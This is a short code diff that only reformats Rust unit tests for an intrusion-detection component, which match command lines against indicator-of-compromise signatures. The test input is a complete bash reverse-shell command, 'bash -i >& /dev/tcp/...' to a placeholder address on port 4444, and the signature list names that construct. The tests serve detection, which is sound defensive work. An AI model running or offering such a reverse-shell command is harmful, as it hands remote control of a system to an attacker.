@@ -545,13 +545,13 @@ mod tests {
     #[test]
     fn check_text_detects_reverse_shell() {
         let mut l1 = IocLayer1::new();
-        l1.load_string_signatures([
-            ">& /dev/tcp/".to_string(),
-            "bash -i".to_string(),
-        ]);
+        l1.load_string_signatures([">& /dev/tcp/".to_string(), "bash -i".to_string()]);
         let hits = l1.check_text("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1");
         eprintln!("hits = {:?}", hits);
-        assert!(!hits.is_empty(), "expected to find 'bash -i' in command line");
+        assert!(
+            !hits.is_empty(),
+            "expected to find 'bash -i' in command line"
+        );
         assert!(hits.iter().any(|h| h.contains("bash -i")));
     }
 
@@ -580,10 +580,10 @@ mod tests {
             dst_domain: None,
             command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
             event_size: None,
-        container_runtime: None,
-        container_id: None,
-        container_escape: false,
-        container_privileged: false,
+            container_runtime: None,
+            container_id: None,
+            container_escape: false,
+            container_privileged: false,
         };
         let hit = l1.check_event(&event);
         eprintln!("hit = {:?}", hit);
